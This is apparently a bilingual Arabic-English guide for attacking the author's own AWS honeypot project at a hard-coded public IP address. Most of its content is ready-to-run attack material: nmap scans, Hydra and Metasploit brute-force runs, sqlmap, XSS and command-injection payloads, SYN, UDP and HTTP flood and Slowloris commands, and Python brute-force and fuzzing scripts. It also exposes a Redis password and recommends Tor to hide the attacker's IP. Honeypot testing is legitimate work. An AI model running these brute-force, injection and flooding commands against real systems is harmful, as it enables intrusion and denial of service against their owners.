# دليل اختبار الاختراق - Penetration Testing Guide

## 🎯 معلومات الهدف - Target Information

**IP:** `13.53.131.159`  
**Location:** AWS eu-north-1  
**Honeypot Ports:**
- SSH: 2222
- FTP: 2121
- HTTP: 8080
- MySQL: 3307
- Telnet: 2323

---

## 🛠️ الأدوات المطلوبة - Required Tools

### Linux (Kali/Ubuntu)
```bash
sudo apt update
sudo apt install -y nmap hydra sqlmap metasploit-framework nikto hping3 dirb
```

### Windows
- Download Nmap: https://nmap.org/download.html
- Download Metasploit: https://www.metasploit.com/download
- Download Hydra: https://github.com/vanhauser-thc/thc-hydra/releases

---

## 📡 1. Network Scanning - فحص الشبكة

### Port Scan الأساسي
```bash
nmap -sV -p 2121,2222,2323,3307,8080 13.53.131.159
```

**المخرجات المتوقعة:**
```
PORT     STATE SERVICE  VERSION
2121/tcp open  ftp      vsftpd 3.0.3
2222/tcp open  ssh      OpenSSH 8.0
2323/tcp open  telnet   Linux telnetd
3307/tcp open  mysql    MySQL 5.7.31
8080/tcp open  http     Apache httpd 2.4.41
```

### Aggressive Scan - فحص متقدم
```bash
nmap -A -T4 -p 2121,2222,2323,3307,8080 13.53.131.159 -oN scan_results.txt
```

### OS Detection - كشف نظام التشغيل
```bash
nmap -O 13.53.131.159
```

### Vulnerability Scan - فحص الثغرات
```bash
nmap --script=vuln -p 2121,2222,2323,3307,8080 13.53.131.159
```

---

## 🔓 2. Brute Force Attacks - هجمات التخمين

### SSH Brute Force (Port 2222)
```bash
# Create password list
echo -e "admin\nroot\npassword\n123456\nadmin123\nroot123" > passwords.txt

# Hydra attack
hydra -l root -P passwords.txt ssh://13.53.131.159:2222 -t 4 -V

# Or with common users
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P passwords.txt ssh://13.53.131.159:2222
```

### FTP Brute Force (Port 2121)
```bash
hydra -l anonymous -P passwords.txt ftp://13.53.131.159:2121

# Anonymous FTP test
ftp 13.53.131.159 2121
# Username: anonymous
# Password: anonymous
```

### MySQL Brute Force (Port 3307)
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://13.53.131.159:3307

# Or quick test
mysql -h 13.53.131.159 -P 3307 -u root -p
```

### Telnet Brute Force (Port 2323)
```bash
hydra -l admin -P passwords.txt telnet://13.53.131.159:2323
```

---

## 🌐 3. Web Application Testing - اختبار تطبيقات الويب

### HTTP Service (Port 8080)

#### Nikto Scan - فحص ثغرات الويب
```bash
nikto -h http://13.53.131.159:8080 -C all
```

#### Directory Brute Force
```bash
dirb http://13.53.131.159:8080 /usr/share/wordlists/dirb/common.txt
```

#### SQL Injection Test
```bash
# Manual test
curl "http://13.53.131.159:8080/login?user=admin'&pass=test"

# SQLMap automated
sqlmap -u "http://13.53.131.159:8080/login?user=admin&pass=test" --batch --level=3 --risk=2

# POST method
sqlmap -u "http://13.53.131.159:8080/login" --data="username=admin&password=test" --dbs
```

#### XSS Testing
```bash
curl "http://13.53.131.159:8080/search?q=<script>alert('XSS')</script>"
```

#### Command Injection
```bash
curl "http://13.53.131.159:8080/ping?host=127.0.0.1;ls"
curl "http://13.53.131.159:8080/ping?host=127.0.0.1|whoami"
```

---

## 💣 4. Metasploit Framework

### Start Metasploit
```bash
msfconsole
```

### SSH Exploit
```ruby
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 13.53.131.159
set RPORT 2222
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set THREADS 10
run
```

### FTP Exploit
```ruby
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 13.53.131.159
set RPORT 2121
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE passwords.txt
run
```

### MySQL Exploit
```ruby
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 13.53.131.159
set RPORT 3307
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

### HTTP Exploit
```ruby
use auxiliary/scanner/http/http_login
set RHOSTS 13.53.131.159
set RPORT 8080
set AUTH_URI /login
set USERPASS_FILE /usr/share/wordlists/metasploit/http_default_users.txt
run
```

---

## 🚨 5. DoS/DDoS Testing - اختبار حجب الخدمة

### SYN Flood
```bash
hping3 -S --flood -V -p 8080 13.53.131.159
```

### HTTP Flood
```bash
# Simple HTTP flood
while true; do curl http://13.53.131.159:8080/ & done

# SlowLoris attack
slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET -u http://13.53.131.159:8080
```

### UDP Flood
```bash
hping3 --udp --flood -V --rand-source -p 2121 13.53.131.159
```

---

## 🔍 6. Advanced Recon - استطلاع متقدم

### Banner Grabbing
```bash
nc -v 13.53.131.159 2222
nc -v 13.53.131.159 2121
nc -v 13.53.131.159 8080
```

### SSL/TLS Testing
```bash
sslscan 13.53.131.159:443
nmap --script ssl-enum-ciphers -p 443 13.53.131.159
```

### SNMP Enumeration
```bash
snmpwalk -v2c -c public 13.53.131.159
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 13.53.131.159
```

---

## 📊 7. Monitoring Attacks - مراقبة الهجمات

### Check Dashboard Real-time
```bash
# Open browser to see attacks
http://13.53.131.159:8501
```

### View Attack Logs
```bash
ssh -i ~/.ssh/cyber_mirage ubuntu@13.53.131.159
sudo docker logs cyber_mirage_honeypot_ssh -f
sudo docker logs cyber_mirage_honeypot_ftp -f
sudo docker logs cyber_mirage_honeypot_http -f
```

### Query Attack Database
```bash
ssh -i ~/.ssh/cyber_mirage ubuntu@13.53.131.159
sudo docker exec -it cyber_mirage_postgres psql -U cybermirage -d cyber_mirage

# SQL queries
SELECT COUNT(*) FROM attack_sessions;
SELECT attacker_name, attacker_skill, detected FROM attack_sessions ORDER BY start_time DESC LIMIT 10;
SELECT origin, COUNT(*) as total FROM attack_sessions GROUP BY origin;
```

### Redis Threat Intelligence
```bash
ssh -i ~/.ssh/cyber_mirage ubuntu@13.53.131.159
sudo docker exec -it cyber_mirage_redis redis-cli -a changeme123

# Redis commands
KEYS threat:*
HGETALL threat:YOUR_IP
```

---

## 🎯 8. Custom Attack Scripts - سكريبتات مخصصة

### SSH Automated Attack
```python
import paramiko
import time

host = "13.53.131.159"
port = 2222
passwords = ["admin", "password", "123456", "root123"]

for password in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username="root", password=password, timeout=5)
        print(f"[+] Success! Password: {password}")
        ssh.close()
        break
    except:
        print(f"[-] Failed: {password}")
        time.sleep(2)
```

### HTTP Fuzzer
```python
import requests
import time

url = "http://13.53.131.159:8080/login"
payloads = [
    "admin' OR '1'='1",
    "<script>alert('XSS')</script>",
    "'; DROP TABLE users--",
    "../../etc/passwd"
]

for payload in payloads:
    try:
        data = {"username": payload, "password": "test"}
        r = requests.post(url, data=data, timeout=5)
        print(f"[+] Payload: {payload[:30]} | Status: {r.status_code}")
        time.sleep(1)
    except Exception as e:
        print(f"[-] Error: {e}")
```

### FTP Enumeration
```python
from ftplib import FTP

host = "13.53.131.159"
port = 2121

try:
    ftp = FTP()
    ftp.connect(host, port)
    ftp.login("anonymous", "anonymous@test.com")
    print("[+] Anonymous login successful!")
    ftp.retrlines('LIST')
    ftp.quit()
except Exception as e:
    print(f"[-] Error: {e}")
```

---

## ⚠️ Testing Checklist - قائمة الفحص

- [ ] Port scan completed (nmap)
- [ ] SSH brute force attempted
- [ ] FTP anonymous access tested
- [ ] MySQL connection tested
- [ ] HTTP SQL injection tested
- [ ] XSS payloads submitted
- [ ] DoS attack executed
- [ ] Metasploit exploits run
- [ ] Attack data visible in dashboard
- [ ] Attack logs captured in PostgreSQL
- [ ] Threat intelligence stored in Redis

---

## 📈 Expected Results - النتائج المتوقعة

### Dashboard Should Show:
1. **Total Attacks Count** - عدد الهجمات الكلي
2. **Today's Attacks** - هجمات اليوم
3. **Last Hour Attacks** - هجمات آخر ساعة
4. **Detection Rate** - نسبة الكشف
5. **Top Threat IPs** - أكثر IPs مهاجمة
6. **Hourly Attack Timeline** - جدول هجمات 24 ساعة
7. **Recent Attack Details** - تفاصيل الهجمات الأخيرة

### PostgreSQL Attack Sessions:
```sql
SELECT 
    attacker_name,
    attacker_skill,
    origin,
    detected,
    start_time
FROM attack_sessions 
ORDER BY start_time DESC;
```

### Redis Threat Data:
```
threat:YOUR_IP
  - count: 15
  - last_seen: 2025-01-23 18:30:45
```

---

## 🔒 Safety Notes - ملاحظات الأمان

1. ⚠️ **هذا النظام honeypot - لا تستخدم هجمات حقيقية على أنظمة أخرى**
2. 🛡️ **استخدم VPN أو Tor لإخفاء IP الحقيقي**
3. ⏱️ **استخدم delays بين الطلبات لتجنب rate limiting**
4. 📊 **راقب Dashboard لرؤية الهجمات real-time**
5. 🗑️ **امسح البيانات بعد الاختبار:**
   ```bash
   ssh ubuntu@13.53.131.159 "cd /opt/cyber_mirage && sudo docker compose -f docker-compose.production.yml down -v && sudo docker compose -f docker-compose.production.yml up -d"
   ```

---

## 📞 Support

إذا واجهت مشاكل:
- تحقق من أن الـ ports مفتوحة: `nmap 13.53.131.159`
- تحقق من الـ dashboard: `http://13.53.131.159:8501`
- شاهد الـ logs: `sudo docker logs cyber_mirage_honeypot_ssh`

**Dashboard:** http://13.53.131.159:8501  
**Grafana:** http://13.53.131.159:3000 (Username: admin, Password: check AWS logs)  
**Prometheus:** http://13.53.131.159:9090
